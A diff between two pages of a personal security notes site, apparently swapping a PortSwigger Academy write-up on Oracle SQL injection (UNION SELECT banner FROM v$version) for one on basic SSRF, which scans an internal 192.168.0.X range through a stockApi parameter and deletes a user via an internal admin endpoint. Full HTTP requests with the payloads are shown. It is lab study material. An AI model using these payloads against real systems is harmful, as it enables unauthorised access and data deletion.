@@ -12,13 +12,13 @@
         <meta name="author" content="Tom Fieber">
       
       
-        <link rel="canonical" href="https://tomfieber.github.io/resources/PortSwigger/SQL-Injection/sqli-lab-3/">
+        <link rel="canonical" href="https://tomfieber.github.io/resources/PortSwigger/SSRF/ssrf-lab-2/">
       
       
-        <link rel="prev" href="../sqli-lab-2/">
+        <link rel="prev" href="../ssrf-lab-1/">
       
       
-        <link rel="next" href="../sqli-lab-4/">
+        <link rel="next" href="../ssrf-lab-3/">
       
       
         
@@ -29,7 +29,7 @@
     
     
       
-        <title>SQL injection attack, querying the database type and version on Oracle - pawpawhacks</title>
+        <title>Basic SSRF against another back-end system - pawpawhacks</title>
       
     
     
@@ -116,7 +116,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#sql-injection-attack-querying-the-database-type-and-version-on-oracle" class="md-skip">
+        <a href="#basic-ssrf-against-another-back-end-system" class="md-skip">
           Skip to content
         </a>
       
@@ -150,7 +150,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              SQL injection attack, querying the database type and version on Oracle
+              Basic SSRF against another back-end system
             
           </span>
         </div>
@@ -1750,10 +1750,8 @@
                 
   
   
-    
   
   
-  
     
     
       
@@ -1778,11 +1776,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_4" >
         
           
           <label class="md-nav__link" for="__nav_4_4_4" id="__nav_4_4_4_label" tabindex="0">
@@ -1803,7 +1801,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4_4_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1821,7 +1819,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../_cheatsheet/" class="md-nav__link">
+      <a href="../../SQL-Injection/_cheatsheet/" class="md-nav__link">
         
   
   
@@ -1849,7 +1847,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sqli-lab-1/" class="md-nav__link">
+      <a href="../../SQL-Injection/sqli-lab-1/" class="md-nav__link">
         
   
   
@@ -1877,7 +1875,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sqli-lab-2/" class="md-nav__link">
+      <a href="../../SQL-Injection/sqli-lab-2/" class="md-nav__link">
         
   
   
@@ -1885,6 +1883,190 @@
     
   
     SQL injection vulnerability allowing login bypass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL-Injection/sqli-lab-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL injection attack, querying the database type and version on Oracle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL-Injection/sqli-lab-4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL injection attack, querying the database type and version on MySQL and Microsoft
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL-Injection/sqli-lab-5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL injection attack, listing the database contents on non-Oracle databases
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_4_5" id="__nav_4_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SSRF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf-lab-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic SSRF against the local server
   
 
     
@@ -1921,7 +2103,7 @@
   <span class="md-ellipsis">
     
   
-    SQL injection attack, querying the database type and version on Oracle
+    Basic SSRF against another back-end system
   
 
     
@@ -1939,7 +2121,7 @@
   <span class="md-ellipsis">
     
   
-    SQL injection attack, querying the database type and version on Oracle
+    Basic SSRF against another back-end system
   
 
     
@@ -2003,189 +2185,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../sqli-lab-4/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    SQL injection attack, querying the database type and version on MySQL and Microsoft
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../sqli-lab-5/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    SQL injection attack, listing the database contents on non-Oracle databases
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-      
-        
-      
-        
-      
-        
-      
-        
-      
-    
-    
-    
-      
-      
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4_5" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_4_5" id="__nav_4_4_5_label" tabindex="0">
-            
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    SSRF
-  
-
-    
-  </span>
-  
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_4_5_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_4_5">
-            <span class="md-nav__icon md-icon"></span>
-            
-  
-    SSRF
-  
-
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../SSRF/ssrf-lab-1/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Basic SSRF against the local server
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../SSRF/ssrf-lab-2/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Basic SSRF against another back-end system
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../SSRF/ssrf-lab-3/" class="md-nav__link">
+      <a href="../ssrf-lab-3/" class="md-nav__link">
         
   
   
@@ -2213,7 +2213,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../SSRF/ssrf-lab-6/" class="md-nav__link">
+      <a href="../ssrf-lab-6/" class="md-nav__link">
         
   
   
@@ -2393,10 +2393,10 @@
     
     
       <li class="md-path__item">
-        <a href="../_cheatsheet/" class="md-path__link">
+        <a href="../ssrf-lab-1/" class="md-path__link">
           
   <span class="md-ellipsis">
-    SQL Injection
+    SSRF
   </span>
 
         </a>
@@ -2413,56 +2413,56 @@
                 
                   
 
-<h1 id="sql-injection-attack-querying-the-database-type-and-version-on-oracle">SQL injection attack, querying the database type and version on Oracle</h1>
+<h1 id="basic-ssrf-against-another-back-end-system">Basic SSRF against another back-end system</h1>
 <h2 id="instructions">Instructions</h2>
-<p>This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p>
-<p>To solve the lab, display the database version string.</p>
-<p>??? warning "Hint"</p>
-<div class="language-text highlight"><pre><span></span><code>On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
-
-There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT &#39;abc&#39; FROM dual`
-</code></pre></div>
+<p>This lab has a stock check feature which fetches data from an internal system.</p>
+<p>To solve the lab, use the stock check functionality to scan the internal <code>192.168.0.X</code> range for an admin interface on port <code>8080</code>, then use it to delete the user <code>carlos</code>.</p>
 <h2 id="solution">Solution</h2>
-<p>Since the vulnerability lies in the category parameter, we will focus there. </p>
-<div class="language-text highlight"><span class="filename">Initial request</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>GET /filter?category=Gifts HTTP/2
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Host: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Cookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Sec-Ch-Ua: &quot;Not_A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;142&quot;
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Sec-Ch-Ua-Mobile: ?0
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Sec-Ch-Ua-Platform: &quot;macOS&quot;
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Accept-Language: en-US,en;q=0.9
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>Upgrade-Insecure-Requests: 1
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Sec-Fetch-Site: same-origin
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>Sec-Fetch-Mode: navigate
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>Sec-Fetch-User: ?1
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Sec-Fetch-Dest: document
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Referer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Accept-Encoding: gzip, deflate, br
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>Priority: u=0, i
+<p>View any item and check the stock. Notice that the stockAPI makes a request to 192.168.0.X. Change the endpoint to /admin and send the request to intruder. </p>
+<div class="language-text highlight"><span class="filename">Intruder request to /admin</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>POST /product/stock HTTP/1.1
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Host: 0a160088041648828637c7c100e30045.web-security-academy.net
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Accept: */*
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Accept-Encoding: gzip, deflate, br, zstd
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Referer: https://0a160088041648828637c7c100e30045.web-security-academy.net/product?productId=1
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Content-Length: 96
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Origin: https://0a160088041648828637c7c100e30045.web-security-academy.net
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Connection: keep-alive
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>Cookie: session=idvkWi3Mg7hf5Y2JA6V0xfqVw8Fsw0Ig
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>X-PwnFox-Color: magenta
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>Priority: u=0
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin
 </span></code></pre></div>
-<p>After testing with basic UNION payloads, we find that there are two columns returned. </p>
-<p>The following query retrieves the database version.</p>
-<div class="language-text highlight"><span class="filename">Final payload</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>GET /filter?category=Gifts&#39;+UNION+SELECT+null,banner+FROM+v$version-- HTTP/2
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Host: 0aca008a03ea55be81c7531f00dc005b.web-security-academy.net
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Cookie: session=vHP4Xt5RPT4TD8vzgc4yEg8biGUdELPe
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Sec-Ch-Ua: &quot;Not_A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;142&quot;
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Sec-Ch-Ua-Mobile: ?0
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Sec-Ch-Ua-Platform: &quot;macOS&quot;
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>Accept-Language: en-US,en;q=0.9
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>Upgrade-Insecure-Requests: 1
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>Sec-Fetch-Site: same-origin
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>Sec-Fetch-Mode: navigate
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>Sec-Fetch-User: ?1
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>Sec-Fetch-Dest: document
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>Referer: https://0aca008a03ea55be81c7531f00dc005b.web-security-academy.net/
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>Accept-Encoding: gzip, deflate, br
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>Priority: u=0, i
-</span></code></pre></div>
-<p><img alt="" src="../attachments/sqli-lab-3/file-20251110154032325.png" /></p>
+<p>Set a placeholder on the last octet and launch the attack. Most of the responses returned a 500 status code, so filter on the one(s) that are not 500s. </p>
+<p><img alt="" src="../attachments/ssrf-lab-2/file-20251112160431482.png" /></p>
+<p>We find that /admin is hosted on 192.168.0.112. Now we can send this to repeater and change the endpoint to <code>/admin/delete?username=carlos</code>. </p>
+<div class="language-text highlight"><span class="filename">Solve the lab</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>POST /product/stock HTTP/1.1
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Host: 0a160088041648828637c7c100e30045.web-security-academy.net
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Accept: */*
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Accept-Encoding: gzip, deflate, br, zstd
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>Referer: https://0a160088041648828637c7c100e30045.web-security-academy.net/product?productId=1
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>Content-Type: application/x-www-form-urlencoded
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>Content-Length: 50
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>Origin: https://0a160088041648828637c7c100e30045.web-security-academy.net
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>Connection: close
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>Cookie: session=idvkWi3Mg7hf5Y2JA6V0xfqVw8Fsw0Ig
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>Sec-Fetch-Dest: empty
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>Sec-Fetch-Mode: cors
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>Sec-Fetch-Site: same-origin
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>X-PwnFox-Color: magenta
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>Priority: u=0
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="hll">stockApi=http%3A%2F%2F192.168.0.112%3A8080%2Fadmin/delete?username=carlos
+</span></span></code></pre></div>
+<p>Follow the redirection and solve the lab.</p>
 
 
   <nav class="md-tags" >
@@ -2471,14 +2471,7 @@ There is a built-in table on Oracle called `dual` which you can use for this p
       
       
       
-        <span class="md-tag">injection</span>
-      
-    
-      
-      
-      
-      
-        <span class="md-tag">sql</span>
+        <span class="md-tag">ssrf</span>
       
     
   </nav>
@@ -2523,7 +2516,7 @@ There is a built-in table on Oracle called `dual` which you can use for this p
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../sqli-lab-2/" class="md-footer__link md-footer__link--prev" aria-label="Previous: SQL injection vulnerability allowing login bypass">
+          <a href="../ssrf-lab-1/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Basic SSRF against the local server">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
@@ -2533,20 +2526,20 @@ There is a built-in table on Oracle called `dual` which you can use for this p
                 Previous
               </span>
               <div class="md-ellipsis">
-                SQL injection vulnerability allowing login bypass
+                Basic SSRF against the local server
               </div>
             </div>
           </a>
         
         
           
-          <a href="../sqli-lab-4/" class="md-footer__link md-footer__link--next" aria-label="Next: SQL injection attack, querying the database type and version on MySQL and Microsoft">
+          <a href="../ssrf-lab-3/" class="md-footer__link md-footer__link--next" aria-label="Next: Blind SSRF with out-of-band detection">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                SQL injection attack, querying the database type and version on MySQL and Microsoft
+                Blind SSRF with out-of-band detection
               </div>
             </div>
             <div class="md-footer__button md-icon">
